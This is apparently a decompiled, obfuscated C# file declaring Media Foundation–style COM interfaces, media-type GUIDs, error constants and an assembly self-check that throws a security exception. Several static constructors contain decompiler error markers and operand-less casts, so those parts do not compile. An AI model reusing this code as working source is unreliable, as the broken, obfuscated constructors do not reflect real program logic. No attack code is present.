			//IL_01fa: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107411723);
			new Guid((string)/*Error near IL_01f0: Stack underflow*/);
			_0001 = (Guid)/*Error near IL_0014: Stack underflow*/;
			_0080._0014._0001(107411194);
			_0002 = new Guid((string)/*Error near IL_0023: Stack underflow*/);
			_0003 = new Guid(_0080._0014._0001(107392912));
			_0004 = new Guid(_0080._0014._0001(107392515));
			_0005 = new Guid(_0080._0014._0001(107411113));
			_0006 = new Guid(_0080._0014._0001(107393010));
			_0007 = new Guid(_0080._0014._0001(107411096));
			_0008 = new Guid(_0080._0014._0001(107411015));
			_000E = new Guid(_0080._0014._0001(107410998));
			_000F = new Guid(_0080._0014._0001(107411429));
			_0010 = new Guid(_0080._0014._0001(107411412));
			_0011 = new Guid(_0080._0014._0001(107411331));
			_0012 = new Guid(_0080._0014._0001(107411314));
			_0013 = new Guid(_0080._0014._0001(107411233));
			_0014 = new Guid(_0080._0014._0001(107392929));
			_0015 = new Guid(_0080._0014._0001(107411216));
			_0016 = new Guid(_0080._0014._0001(107410655));
			_0017 = new Guid(_0080._0014._0001(107410574));
			_0018 = new Guid(_0080._0014._0001(107410557));
			_0019 = new Guid(_0080._0014._0001(107410476));
			_001A = new Guid(_0080._0014._0001(107410459));
			_001B = new Guid(_0080._0014._0001(107410890));
			_001C = new Guid(_0080._0014._0001(107410873));
			_001D = new Guid(_0080._0014._0001(107410792));
		}
	}
}
namespace _007F
{
	[ComImport]
	[Guid("E7FE2E12-661C-40DA-92F9-4F002AB67627")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	public interface _0011
	{
		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPWStr)] string _0003, [In][MarshalAs(UnmanagedType.Interface)] global::_0008._000E _0004, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0005, [MarshalAs(UnmanagedType.Interface)] out object _0006);

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.IUnknown)] object _0003, [In][MarshalAs(UnmanagedType.Interface)] global::_0008._000E _0004, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0005, [MarshalAs(UnmanagedType.Interface)] out object _0006);
	}
}
namespace _0003
{
	[ComImport]
	[Guid("48e2ed0f-98c2-4a37-bed5-166312ddd83f")]
	public sealed class _000E
	{
		[MethodImpl(MethodImplOptions.InternalCall)]
		public extern _000E();
	}
}
namespace _0010
{
	internal static class _0012
	{
		public const int _0001 = -1072875856;

		public const int _0002 = -1072875855;

		public const int _0003 = -1072875854;

		public const int _0004 = -1072875853;

		public const int _0005 = -1072875852;

		public const int _0006 = -1072875851;

		public const int _0007 = -1072875850;

		public const int _0008 = -1072875849;

		public const int _000E = -1072875847;

		public const int _000F = -1072875846;

		public const int _0010 = -1072875845;

		public const int _0011 = -1072875844;

		public const int _0012 = -1072875843;

		public const int _0013 = -1072875842;

		public const int _0014 = -1072875841;

		public const int _0015 = -1072875840;

		public const int _0016 = -1072875837;

		public const int _0017 = -1072875836;

		public const int _0018 = -1072875835;

		public const int _0019 = -1072875832;

		public const int _001A = -1072875831;

		public const int _001B = -1072875829;

		public const int _001C = -1072875825;

		public const int _001D = -1072875824;

		public const int _001E = -1072875823;

		public const int _001F = -1072875822;

		public const int _007F = -1072875821;

		public const int _0080 = -1072875820;

		public const int _0081 = -1072875819;

		public const int _0082 = -1072875818;

		public const int _0083 = -1072875817;

		public const int _0084 = 866008;

		public const int _0086 = -1072875815;

		public const int _0087 = -1072875814;

		public const int _0088 = -1072875813;

		public const int _0089 = -1072875812;

		public const int _008A = -1072875811;

		public const int _008B = -1072875810;

		public const int _008C = -1072875809;

		public const int _008D = -1072875808;

		public const int _008E = -1072875806;

		public const int _008F = -1072875805;

		public const int _0090 = -1072875804;

		public const int _0091 = -1072875803;

		public const int _0092 = -1072875802;

		public const int _0093 = -1072875801;

		public const int _0094 = -1072875800;

		public const int _0095 = -1072875799;

		public const int _0096 = -1072875798;

		public const int _0097 = -1072875797;

		public const int _0098 = -1072875796;

		public const int _0099 = -1072875795;

		public const int _009A = -1072875794;

		public const int _009B = -1072875793;

		public const int _009C = -1072875792;

		public const int _009D = -1072875791;

		public const int _009E = -1072875790;

		public const int _009F = -1072875789;

		public const int _0001_0002 = -1072875788;

		public const int _0002_0002 = -1072875787;

		public const int _0003_0002 = -1072875786;

		public const int _0004_0002 = -1072875785;

		public const int _0005_0002 = -1072875784;

		public const int _0006_0002 = -1072860816;

		public const int _0007_0002 = -1072875782;

		public const int _0008_0002 = -1072875781;

		public const int _000E_0002 = -1072875780;

		public const int _000F_0002 = 866045;

		public const int _0010_0002 = -1072875778;

		public const int _0011_0002 = -1072875777;

		public const int _0012_0002 = -1072875776;

		public const int _0013_0002 = -1072875775;

		public const int _0014_0002 = -1072875774;

		public const int _0015_0002 = -1072875773;

		public const int _0016_0002 = -1072875772;

		public const int _0017_0002 = 1074608792;

		public const int _0018_0002 = -1072874856;

		public const int _0019_0002 = -1072874855;

		public const int _001A_0002 = -1072874854;

		public const int _001B_0002 = -1072874853;

		public const int _001C_0002 = -1072874852;

		public const int _001D_0002 = -1072874851;

		public const int _001E_0002 = -1072874850;

		public const int _001F_0002 = -1072874849;

		public const int _007F_0002 = -1072874848;

		public const int _0080_0002 = -1072874847;

		public const int _0081_0002 = -1072873856;

		public const int _0082_0002 = -1072873854;

		public const int _0083_0002 = -1072873852;

		public const int _0084_0002 = -1072873851;

		public const int _0086_0002 = -1072873850;

		public const int _0087_0002 = -1072873849;

		public const int _0088_0002 = -1072873848;

		public const int _0089_0002 = -1072873847;

		public const int _008A_0002 = -1072873846;

		public const int _008B_0002 = -1072873844;

		public const int _008C_0002 = -1072873843;

		public const int _008D_0002 = -1072873842;

		public const int _008E_0002 = -1072873841;

		public const int _008F_0002 = -1072873839;

		public const int _0090_0002 = -1072873832;

		public const int _0091_0002 = -1072873831;

		public const int _0092_0002 = -1072873830;

		public const int _0093_0002 = -1072873829;

		public const int _0094_0002 = -1072873828;

		public const int _0095_0002 = -1072873827;

		public const int _0096_0002 = -1072872856;

		public const int _0097_0002 = -1072872855;

		public const int _0098_0002 = -1072872854;

		public const int _0099_0002 = -1072872853;

		public const int _009A_0002 = -1072872852;

		public const int _009B_0002 = -1072872851;

		public const int _009C_0002 = -1072872850;

		public const int _009D_0002 = -1072872849;

		public const int _009E_0002 = -1072872848;

		public const int _009F_0002 = -1072872847;

		public const int _0001_0003 = 1074610802;

		public const int _0002_0003 = -1072872844;

		public const int _0003_0003 = -1072872843;

		public const int _0004_0003 = -1072872842;

		public const int _0005_0003 = -1072872841;

		public const int _0006_0003 = -1072872840;

		public const int _0007_0003 = -1072872839;

		public const int _0008_0003 = -1072872838;

		public const int _000E_0003 = -1072872837;

		public const int _000F_0003 = -1072872836;

		public const int _0010_0003 = -1072872835;

		public const int _0011_0003 = -1072872834;

		public const int _0012_0003 = -1072872833;

		public const int _0013_0003 = -1072872832;

		public const int _0014_0003 = -1072872831;

		public const int _0015_0003 = -1072872830;

		public const int _0016_0003 = -1072872829;

		public const int _0017_0003 = -1072872828;

		public const int _0018_0003 = -1072872827;

		public const int _0019_0003 = -1072872826;

		public const int _001A_0003 = -1072872825;

		public const int _001B_0003 = -1072872824;

		public const int _001C_0003 = -1072872823;

		public const int _001D_0003 = -1072872822;

		public const int _001E_0003 = -1072872821;

		public const int _001F_0003 = -1072872820;

		public const int _007F_0003 = -1072872819;

		public const int _0080_0003 = -1072872818;

		public const int _0081_0003 = -1072872817;

		public const int _0082_0003 = -1072872816;

		public const int _0083_0003 = -1072872815;

		public const int _0084_0003 = -1072872814;

		public const int _0086_0003 = -1072872813;

		public const int _0087_0003 = -1072872812;

		public const int _0088_0003 = -1072871856;

		public const int _0089_0003 = -1072871855;

		public const int _008A_0003 = -1072871854;

		public const int _008B_0003 = -1072871853;

		public const int _008C_0003 = -1072871852;

		public const int _008D_0003 = -1072871851;

		public const int _008E_0003 = -1072871850;

		public const int _008F_0003 = -1072871849;

		public const int _0090_0003 = -1072871848;

		public const int _0091_0003 = -1072871847;

		public const int _0092_0003 = -1072870856;

		public const int _0093_0003 = -1072870854;

		public const int _0094_0003 = -1072870853;

		public const int _0095_0003 = -1072870852;

		public const int _0096_0003 = -1072870851;

		public const int _0097_0003 = -1072870850;

		public const int _0098_0003 = -1072870849;

		public const int _0099_0003 = -1072870848;

		public const int _009A_0003 = -1072870847;

		public const int _009B_0003 = 870978;

		public const int _009C_0003 = -1072870845;

		public const int _009D_0003 = -1072870844;

		public const int _009E_0003 = -1072869856;

		public const int _009F_0003 = -1072869855;

		public const int _0001_0004 = -1072869854;

		public const int _0002_0004 = -1072869853;

		public const int _0003_0004 = -1072869852;

		public const int _0004_0004 = -1072869851;

		public const int _0005_0004 = -1072869850;

		public const int _0006_0004 = -1072869756;

		public const int _0007_0004 = -1072869755;

		public const int _0008_0004 = -1072869754;

		public const int _000E_0004 = -1072869753;

		public const int _000F_0004 = -1072868850;

		public const int _0010_0004 = -1072868847;

		public const int _0011_0004 = -1072868846;

		public const int _0012_0004 = -1072868845;

		public const int _0013_0004 = -1072868844;

		public const int _0014_0004 = -1072868843;

		public const int _0015_0004 = -1072868842;

		public const int _0016_0004 = -1072868841;

		public const int _0017_0004 = -1072868840;

		public const int _0018_0004 = -1072868839;

		public const int _0019_0004 = -1072868838;

		public const int _001A_0004 = -1072868837;

		public const int _001B_0004 = -1072864852;

		public const int _001C_0004 = 876973;

		public const int _001D_0004 = -1072864850;

		public const int _001E_0004 = 876975;

		public const int _001F_0004 = -1072861856;

		public const int _007F_0004 = -1072861855;

		public const int _0080_0004 = -1072861854;

		public const int _0081_0004 = -1072861853;

		public const int _0082_0004 = -1072861852;

		public const int _0083_0004 = -1072861851;

		public const int _0084_0004 = -1072861850;

		public const int _0086_0004 = -1072861849;

		public const int _0087_0004 = -1072861848;

		public const int _0088_0004 = -1072861847;

		public const int _0089_0004 = -1072861846;

		public const int _008A_0004 = -1072861845;

		public const int _008B_0004 = -1072861844;

		public const int _008C_0004 = -1072861843;

		public const int _008D_0004 = -1072861842;

		public const int _008E_0004 = -1072861841;

		public const int _008F_0004 = -1072861840;

		public const int _0090_0004 = -1072861838;

		public const int _0091_0004 = -1072861837;

		public const int _0092_0004 = -1072861836;

		public const int _0093_0004 = 879989;

		public const int _0094_0004 = -1072861834;

		public const int _0095_0004 = -1072861833;

		public const int _0096_0004 = -1072861832;

		public const int _0097_0004 = -1072860856;

		public const int _0098_0004 = -1072860855;

		public const int _0099_0004 = -1072860854;

		public const int _009A_0004 = -1072860853;

		public const int _009B_0004 = -1072860852;

		public const int _009C_0004 = -1072860851;

		public const int _009D_0004 = -1072860850;

		public const int _009E_0004 = -1072860849;

		public const int _009F_0004 = 880976;

		public const int _0001_0005 = -1072860847;

		public const int _0002_0005 = -1072860846;

		public const int _0003_0005 = -1072860845;

		public const int _0004_0005 = -1072860844;

		public const int _0005_0005 = -1072860843;

		public const int _0006_0005 = -1072860842;

		public const int _0007_0005 = -1072860841;

		public const int _0008_0005 = -1072860840;

		public const int _000E_0005 = -1072860839;

		public const int _000F_0005 = -1072860838;

		public const int _0010_0005 = -1072860837;

		public const int _0011_0005 = -1072860836;

		public const int _0012_0005 = -1072860835;

		public const int _0013_0005 = -1072860834;

		public const int _0014_0005 = -1072860833;

		public const int _0015_0005 = -1072860832;

		public const int _0016_0005 = -1072860831;

		public const int _0017_0005 = -1072860830;

		public const int _0018_0005 = -1072860829;

		public const int _0019_0005 = -1072860827;

		public const int _001A_0005 = -1072860825;

		public const int _001B_0005 = 881000;

		public const int _001C_0005 = 881001;

		public const int _001D_0005 = -1072860822;

		public const int _001E_0005 = -1072860821;

		public const int _001F_0005 = -1072860820;

		public const int _007F_0005 = -1072860819;

		public const int _0080_0005 = -1072860818;

		public const int _0081_0005 = -1072860817;

		public const int _0082_0005 = -1072860815;

		public const int _0083_0005 = -1072860814;

		public const int _0084_0005 = 881011;

		public const int _0086_0005 = -1072860812;

		public const int _0087_0005 = -1072860811;

		public const int _0088_0005 = -1072860810;

		public const int _0089_0005 = -1072860809;

		public const int _008A_0005 = -1072860808;

		public const int _008B_0005 = -1072860807;

		public const int _008C_0005 = -1072860806;

		public const int _008D_0005 = -1072860805;

		public const int _008E_0005 = -1072860804;

		public const int _008F_0005 = -1072860803;

		public const int _0090_0005 = -1072860802;

		public const int _0091_0005 = -1072860801;

		public const int _0092_0005 = -1072860800;

		public const int _0093_0005 = -1072860799;

		public const int _0094_0005 = -1072860798;

		public const int _0095_0005 = -1072849856;

		public const int _0096_0005 = -1072849855;

		public const int _0097_0005 = -1072849854;

		public const int _0098_0005 = -1072849853;

		public const int _0099_0005 = 891972;

		public const int _009A_0005 = -1072848856;

		public const int _009B_0005 = -1072848855;

		public const int _009C_0005 = -1072848854;

		public const int _009D_0005 = -1072848853;

		public const int _009E_0005 = -1072848852;

		public const int _009F_0005 = -1072847856;

		public const int _0001_0006 = -1072847855;

		public const int _0002_0006 = -1072847854;

		public const int _0003_0006 = -1072846856;

		public const int _0004_0006 = -1072846855;

		public const int _0005_0006 = -1072846854;

		public const int _0006_0006 = -1072846853;

		public const int _0007_0006 = -1072846852;

		public const int _0008_0006 = -1072846851;

		static _0012()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0080
{
	internal static class _0010
	{
		public static readonly Guid _0001;

		[global::_0007._0010("Audio")]
		public static readonly Guid _0002;

		[global::_0007._0010("Video")]
		public static readonly Guid _0003;

		[global::_0007._0010("Protected Media")]
		public static readonly Guid _0004;

		[global::_0007._0010("SAMI captions")]
		public static readonly Guid _0005;

		[global::_0007._0010("Script stream")]
		public static readonly Guid _0006;

		[global::_0007._0010("Still image stream")]
		public static readonly Guid _0007;

		[global::_0007._0010("HTML stream")]
		public static readonly Guid _0008;

		[global::_0007._0010("Binary stream")]
		public static readonly Guid _000E;

		[global::_0007._0010("File transfer")]
		public static readonly Guid _000F;

		static _0010()
		{
			//IL_00ce: Incompatible stack heights: 0 vs 1
			//IL_00d8: Incompatible stack heights: 0 vs 1
			//IL_00e2: Incompatible stack heights: 0 vs 1
			_0014._0001(107410775);
			new Guid((string)/*Error near IL_00d8: Stack underflow*/);
			_0001 = (Guid)/*Error near IL_0014: Stack underflow*/;
			_0014._0001(107410694);
			_0002 = new Guid((string)/*Error near IL_0023: Stack underflow*/);
			_0003 = new Guid(_0014._0001(107410165));
			_0004 = new Guid(_0014._0001(107410084));
			_0005 = new Guid(_0014._0001(107410067));
			_0006 = new Guid(_0014._0001(107409986));
			_0007 = new Guid(_0014._0001(107409969));
			_0008 = new Guid(_0014._0001(107410400));
			_000E = new Guid(_0014._0001(107410351));
			_000F = new Guid(_0014._0001(107410334));
		}
	}
}
namespace _001C
{
	[ComImport]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	[Guid("7FEE9E9A-4A89-47a6-899C-B6A53A70FB67")]
	public interface _000F : global::_0008._000E
	{
		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][Out] IntPtr _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, IntPtr _0003, [MarshalAs(UnmanagedType.Bool)] out bool _0004);

		new void _0001([MarshalAs(UnmanagedType.Interface)] global::_0008._000E _0002, int _0003, [MarshalAs(UnmanagedType.Bool)] out bool _0004);

		new void _0002([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out long _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out double _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out Guid _0003);

		new void _0003([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder _0003, int _0004, out int _0005);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [MarshalAs(UnmanagedType.LPWStr)] out string _0003, out int _0004);

		new void _0004([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [Out][MarshalAs(UnmanagedType.LPArray)] byte[] _0003, int _0004, out int _0005);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out IntPtr _0003, out int _0004);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003, [MarshalAs(UnmanagedType.IUnknown)] out object _0004);

		new void _0002([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, IntPtr _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002);

		new void _0001();

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, long _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, double _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPWStr)] string _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 2)] byte[] _0003, int _0004);

		new void _0001([MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.IUnknown)] object _0003);

		new void _0002();

		new void _0003();

		new void _0001(out int _0002);

		new void _0001(int _0002, out Guid _0003, [In][Out] IntPtr _0004);

		new void _0001([In][MarshalAs(UnmanagedType.Interface)] global::_0008._000E _0002);

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [MarshalAs(UnmanagedType.Interface)] out object _0003);

		void _0004();

		void _0005();
	}
}
namespace _0008
{
	[ComImport]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	[Guid("2CD2D921-C447-44A7-A13C-4ADABFC247E3")]
	public interface _000E
	{
		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][Out] IntPtr _0003);

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, IntPtr _0003, [MarshalAs(UnmanagedType.Bool)] out bool _0004);

		void _0001([MarshalAs(UnmanagedType.Interface)] _000E _0002, int _0003, [MarshalAs(UnmanagedType.Bool)] out bool _0004);

		void _0002([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out long _0003);

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out double _0003);

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out Guid _0003);

		void _0003([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder _0003, int _0004, out int _0005);

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [MarshalAs(UnmanagedType.LPWStr)] out string _0003, out int _0004);

		void _0004([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [Out][MarshalAs(UnmanagedType.LPArray)] byte[] _0003, int _0004, out int _0005);

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out IntPtr _0003, out int _0004);

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003, [MarshalAs(UnmanagedType.IUnknown)] out object _0004);

		void _0002([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, IntPtr _0003);

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002);

		void _0001();

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, int _0003);

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, long _0003);

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, double _0003);

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003);

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPWStr)] string _0003);

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 2)] byte[] _0003, int _0004);

		void _0001([MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.IUnknown)] object _0003);

		void _0002();

		void _0003();

		void _0001(out int _0002);

		void _0001(int _0002, out Guid _0003, [In][Out] IntPtr _0004);

		void _0001([In][MarshalAs(UnmanagedType.Interface)] _000E _0002);
	}
}
namespace _001A
{
	[ComImport]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	[Guid("5BC8A76B-869A-46A3-9B03-FA218A66AEBE")]
	public interface _000E
	{
		void _0001(out int _0002);

		void _0001([In] int _0002, [MarshalAs(UnmanagedType.IUnknown)] out object _0003);

		void _0001([In][MarshalAs(UnmanagedType.IUnknown)] object _0002);

		void _0002([In] int _0002, [MarshalAs(UnmanagedType.IUnknown)] out object _0003);

		void _0001([In] int _0002, [In][MarshalAs(UnmanagedType.IUnknown)] object _0003);

		void _0001();
	}
}
namespace _0001
{
	[ComImport]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	[Guid("DF598932-F10C-4E39-BBA2-C308F101DAA3")]
	public interface _0011 : global::_0008._000E
	{
		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][Out] IntPtr _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, IntPtr _0003, [MarshalAs(UnmanagedType.Bool)] out bool _0004);

		new void _0001([MarshalAs(UnmanagedType.Interface)] global::_0008._000E _0002, int _0003, [MarshalAs(UnmanagedType.Bool)] out bool _0004);

		new void _0002([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out long _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out double _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out Guid _0003);

		new void _0003([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder _0003, int _0004, out int _0005);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [MarshalAs(UnmanagedType.LPWStr)] out string _0003, out int _0004);

		new void _0004([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [Out][MarshalAs(UnmanagedType.LPArray)] byte[] _0003, int _0004, out int _0005);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out IntPtr _0003, out int _0004);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003, [MarshalAs(UnmanagedType.IUnknown)] out object _0004);

		new void _0002([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, IntPtr _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002);

		new void _0001();

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, long _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, double _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPWStr)] string _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 2)] byte[] _0003, int _0004);

		new void _0001([MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.IUnknown)] object _0003);

		new void _0002();

		new void _0003();

		new void _0001(out int _0002);

		new void _0001(int _0002, out Guid _0003, [In][Out] IntPtr _0004);

		new void _0001([In][MarshalAs(UnmanagedType.Interface)] global::_0008._000E _0002);

		void _0001(out global::_0017._0018 _0002);

		void _0001(out Guid _0002);

		void _0002([MarshalAs(UnmanagedType.Error)] out int _0002);

		void _0001([Out] IntPtr _0002);
	}
}
namespace _000E
{
	[ComImport]
	[Guid("3137f1cd-fe5e-4805-a5d8-fb477448cb3d")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	public interface _0016
	{
		void _0001([In][MarshalAs(UnmanagedType.Interface)] global::_0019._0012 _0002, out int _0003);

		void _0001([In] int _0002, [In][MarshalAs(UnmanagedType.Interface)] global::_0019._0012 _0003, [In][MarshalAs(UnmanagedType.Interface)] global::_0008._000E _0004);

		void _0001();

		void _0001([In] int _0002, [In][MarshalAs(UnmanagedType.Interface)] global::_0016._0015 _0003);

		void _0001([In] int _0002, [In] long _0003);

		void _0001([In] int _0002, [In] IntPtr _0003);

		void _0001([In] int _0002);

		void _0002([In] int _0002);

		void _0002();

		void _0001([In] int _0002, [In] ref Guid _0003, [In] ref Guid _0004, out IntPtr _0005);

		void _0001([In] int _0002, [In][Out] global::_001F._0012 _0003);
	}
}
namespace _0010
{
	[ComImport]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	[Guid("bf94c121-5b05-4e6f-8000-ba598961414d")]
	public interface _0013
	{
		void _0001(out int _0002, out int _0003, out int _0004, out int _0005);

		void _0001(out int _0002, out int _0003);

		void _0001([In] int _0002, [In][Out] IntPtr _0003, [In] int _0004, [In][Out] IntPtr _0005);

		void _0001([In] int _0002, out global::_0015._0011 _0003);

		void _0001([In] int _0002, out global::_0001._0012 _0003);

		void _0001(out global::_0008._000E _0002);

		void _0001([In] int _0002, out global::_0008._000E _0003);

		void _0002([In] int _0002, out global::_0008._000E _0003);

		void _0001([In] int _0002);

		void _0001([In] int _0002, [In] IntPtr _0003);

		void _0001([In] int _0002, [In] int _0003, out global::_0019._0012 _0004);

		void _0002([In] int _0002, [In] int _0003, out global::_0019._0012 _0004);

		void _0001([In] int _0002, [In] global::_0019._0012 _0003, [In] global::_0013._0013 _0004);

		void _0002([In] int _0002, [In] global::_0019._0012 _0003, [In] global::_0013._0013 _0004);

		void _0001([In] int _0002, out global::_0019._0012 _0003);

		void _0002([In] int _0002, out global::_0019._0012 _0003);

		void _0001([In] int _0002, out global::_0012._000F _0003);

		void _0001([In] int _0002, out global::_0011._0011 _0003);

		void _0001([In] long _0002, [In] long _0003);

		void _0001([In] int _0002, [In] global::_0001._0011 _0003);

		void _0001([In] global::_0006._0011 _0002, [In] IntPtr _0003);

		void _0001([In] int _0002, [In] global::_0016._0015 _0003, int _0004);

		[PreserveSig]
		int _0001([In] global::_007F._0012 _0002, [In] int _0003, [In][Out][MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 1)] global::_000F._000E[] _0004, out global::_0019._0013 _0005);
	}
}
namespace _0017
{
	internal enum _0018
	{
		_0001 = 0,
		_0002 = 1,
		_0003 = 2,
		_0004 = 3,
		_0005 = 100,
		_0006 = 101,
		_0007 = 102,
		_0008 = 103,
		_000E = 104,
		_000F = 105,
		_0010 = 106,
		_0011 = 107,
		_0012 = 108,
		_0013 = 109,
		_0014 = 110,
		_0015 = 111,
		_0016 = 112,
		_0017 = 113,
		_0018 = 114,
		_0019 = 115,
		_001A = 116,
		_001B = 117,
		_001C = 118,
		_001D = 119,
		_001E = 120,
		_001F = 121,
		_007F = 122,
		_0080 = 123,
		_0081 = 124,
		_0082 = 125,
		_0083 = 126,
		_0084 = 127,
		_0086 = 128,
		_0087 = 129,
		_0088 = 200,
		_0089 = 201,
		_008A = 202,
		_008B = 203,
		_008C = 204,
		_008D = 205,
		_008E = 206,
		_008F = 207,
		_0090 = 208,
		_0091 = 209,
		_0092 = 210,
		_0093 = 211,
